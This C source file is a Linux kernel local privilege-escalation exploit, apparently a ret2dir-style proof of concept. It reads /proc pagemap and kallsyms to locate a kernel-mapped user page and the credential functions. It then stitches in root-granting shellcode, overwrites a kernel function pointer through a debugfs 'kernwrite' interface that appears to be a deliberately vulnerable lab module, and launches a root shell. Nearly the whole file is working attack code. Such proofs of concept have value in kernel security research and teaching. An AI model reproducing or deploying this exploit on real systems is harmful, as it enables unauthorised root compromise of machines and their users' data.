#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#include "shellcode.h"

#define TEXT_LEN 64

/* constants */
#define PATH_SZ        32        /* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK    (1ULL << 63)     /* get bit 63 from a 64-bit integer */
#define PFN_MASK    ((1ULL << 55) - 1)    /* get bits 0-54 from */

#define SYMNAME_SZ    1024        /* maximum size of symbol name */
#define ALLOC_STEP    1024*1024*512    /* chunk of 512MB */

#define    ADDR_SZ     32            /* buffer size; 32 bytes */
#define PAGE_OFFSET    0xFFFF880000000000UL    /* kernel space */
#define KERN_EXEC_LOW    0xffff880001bfffffUL    /* exec range start */
#define KERN_EXEC_HIGH    0xffff880036000000UL    /* exec range end */

/* pagemap query result (see querypmap()) */
struct pmap_qres {
    unsigned long    btarget;    /* branch target     */
    size_t        pnum;        /* page number         */
};

static unsigned long
get_ksym(char *name)
{
    /* file pointer    */
    FILE     *f    = NULL;
    
    /* helpers     */
    char c, sym[SYMNAME_SZ];
    void     *addr    = NULL;
    
    
    /* open /proc/kallsyms */
    if ((f = fopen("/proc/kallsyms", "r")) == NULL)
    /* failed */
        errx(3,
             "[Fail] couldn't open /proc/kallsyms -- %s",
             strerror(errno));
    
    /* read kallsyms */
    while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
        if (strlen(sym) == strlen(name) &&
            (strncmp(sym, name, strlen(sym)) == 0))
        /* symbol found; return its address */
            break;
        else
        /* symbol not found */
            addr = NULL;
    
    /* cleanup */
    fclose(f);
    
    /* return the symbol address (or 0)  */
    return (unsigned long)addr;
}

static struct pmap_qres querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
    char             path[PATH_SZ];         /* path in /proc    */
    uint64_t         *pentry    = NULL;     /* pagemap entries  */
    FILE             *fp    = NULL;         /* pagemap file     */
    struct pmap_qres     rval    = {0, 0};   /* return value    */
    unsigned long         kaddr    = 0;     /* helper */
    
    /* 페이지맵 항목 초기화 */
    if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL)
        errx(7,"[Fail] couldn't allocate memory for pagemap entries -- %s",strerror(errno));
        
        memset(path, 0, PATH_SZ);
        
        if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ)        /* format the path variable */
            errx(4,"[Fail] invalid path for /proc/%d/pagemap -- %s",pid,path);
            
            if ((fp = fopen(path, "r")) == NULL)                                    /* open the pagemap file */
                errx(4,"[Fail] couldn't open %s -- %s",path,strerror(errno));
                
                if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1)      /* seek to the appropriate place */
                    errx(5,"[Fail] couldn't seek in pagemap -- %s",strerror(errno));
                    
                    if (fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)                  /* read the corresponding pagemap entries */
                        errx(6,"[Fail] couldn't read pagemap entries -- %s",strerror(errno));
                        
                        vaddr += ((pnum - 1) * psize);
                        while (pnum > 0) {
                            /* check the present bit */
                            if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
                                warnx("[Warn] %#lx is not present in physical memory",vaddr);
                                
                                /* proper accounting */
                                kaddr    = 0;
                                vaddr    -= psize;
                                pnum--;
                                
                                /* continue with the next page */
                                continue;
                            }
                            
                            /* get the kernel-mapped address of vaddr */
                            kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize) + PAGE_OFFSET + (vaddr & (psize - 1));
                            
                            /* valid match ? */
                            if (kaddr >= KERN_EXEC_LOW && kaddr <= KERN_EXEC_HIGH){
                                printf("[*] Found KERN_EXEC Zone!\n");
                                
                                /* yeah baby */
                                break;
                            }
                            
                            /* proper accounting */
                            kaddr    = 0;
                            vaddr    -= psize;
                            pnum--;
                        }
    
    /* cleanup */
    fclose(fp);
    
    /* prepare the query result and return */
    rval.btarget = kaddr;
    rval.pnum     = pnum - 1;
    return rval;
}

void main()
{
    static char buf[512],rop[512];
    char canary[8];
    int fd,i,j;
    
    unsigned long    paddr    = 0;        /* prepare_kernel_cred     */
    unsigned long    caddr    = 0;        /* commit_creds     */
    unsigned long    vaddr    = 0;
    
    char    saddr[ADDR_SZ];        /* shellcode address as a string */
    
    long psize;                            /* page size        */
    char *code        = NULL;            /* shellcode buffer */
    struct pmap_qres res  = {0, 0};/* kernel-level address of payload */
    
    char    *argv[]    = {"/bin/sh", NULL};    /* rootshell */
    
    /* get the page size */
    if ((psize = sysconf(_SC_PAGESIZE)) == -1)
    /* failed */
        errx(2,
             "[Fail] couldn't read page size -- %s",
             strerror(errno));
    
    /* allocate ALLOC_STEP bytes in user space */
    if ((code = mmap(NULL,
                     ALLOC_STEP,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                     -1,
                     0)) == MAP_FAILED)
    /* failed */
        errx(7,
             "[Fail] couldn't allocate memory -- %s", strerror(errno));
    
    /* see if user space is kernel-mapped */
    res = querypmap(getpid(),
                    (unsigned long)code,
                    psize,
                    ALLOC_STEP / psize);
    
    /* bad luck; try again */
    while(res.btarget == 0) {
        /* allocate ALLOC_STEP bytes in user space */
        if ((code = mmap(NULL,
                         ALLOC_STEP,
                         PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                         -1,
                         0)) == MAP_FAILED)
        /* failed */
            errx(7,
                 "[Fail] couldn't allocate memory -- %s",
                 strerror(errno));
        
        /* see if user space is kernel-mapped */
        res = querypmap(getpid(),
                        (unsigned long)code,
                        psize,
                        ALLOC_STEP / psize);
    }

    
    vaddr = (unsigned long)code + res.pnum * psize;
    printf("[*] Page Number %zd\n", res.pnum);
    printf("[*] %#lx is kernel-mapped at %#lx\n\n",vaddr,res.btarget);
    
    /* address for `prepare_kernel_cred' */
    if (paddr < PAGE_OFFSET) {
        /* try to auto-detect it */
        if ((paddr = get_ksym("prepare_kernel_cred")) != 0)
        /* yes! */
            printf("[*] `prepare_kernel_cred' at %#lx\n",paddr);
        else
        /* failed */
            errx(3, "[Fail] couldn't determine the address of `prepare_kernel_cred'");
    }
    
    /* address for `commit_creds' */
    if (caddr < PAGE_OFFSET) {
        /* try to auto-detect it */
        if ((caddr = get_ksym("commit_creds")) != 0)
        /* yes! */
            printf("[*] `commit_creds' at %#lx\n", caddr);
        else
        /* failed */
            errx(3, "[Fail] couldn't determine the address of `commit_creds'");
    }
    
    /* shellcode stitching */
    code += res.pnum * psize;
    memcpy(code, shell_tmpl, SHELL_PREFIX);
                code += SHELL_PREFIX;
    memcpy(code, &caddr, sizeof(unsigned));
                code += sizeof(unsigned);
    memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
                code += SHELL_ADV;
    memcpy(code, &paddr, sizeof(unsigned));
                code += sizeof(unsigned);
    memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX);
    
    /* prepare to overwrite a function pointer via `kernwrite' */
    memset(saddr, 0, ADDR_SZ);
    sprintf(saddr, "%#lx", res.btarget);
    /* verbose */
    fprintf(stdout, "[+] shellcode is at %s\n", saddr);
    
    /* do it (kernwrite specific) */
    if ((fd = open("/sys/kernel/debug/kernwrite/over_func_ptr",
                   O_WRONLY)) == -1)
        errx(8, "[Fail] couldn't open %s -- %s",
             "/sys/kernel/debug/kernwrite/over_func_ptr",
             strerror(errno));
    if (write(fd, saddr, strlen(saddr)) != strlen(saddr))
        errx(8, "[Fail] couldn't write in %s -- %s",
             "/sys/kernel/debug/kernwrite/over_func_ptr",
             strerror(errno));
    close(fd);
    
    if ((fd = open("/sys/kernel/debug/kernwrite/invoke_func",
                   O_WRONLY)) == -1)
        errx(9, "[Fail] couldn't open %s -- %s",
             "/sys/kernel/debug/kernwrite/invoke_func",
             strerror(errno));
    if (write(fd, "1", 1) == -1)
        errx(9, "[Fail] couldn't write in %s -- %s",
             "/sys/kernel/debug/kernwrite/invoke_func",
             strerror(errno));
    close(fd);
    
    /* check to see if we succeeded */
    if (getuid() == 0) {
        /* verbose */
        fprintf(stderr, "[+] p0wned [^_-]\n");
        
        /* execute a rootshell */
        execve("/bin/sh", argv, NULL);
    }
    
    /* l0Ooser */
    fprintf(stderr, "[-] failed to p0wn the machine\n");
}
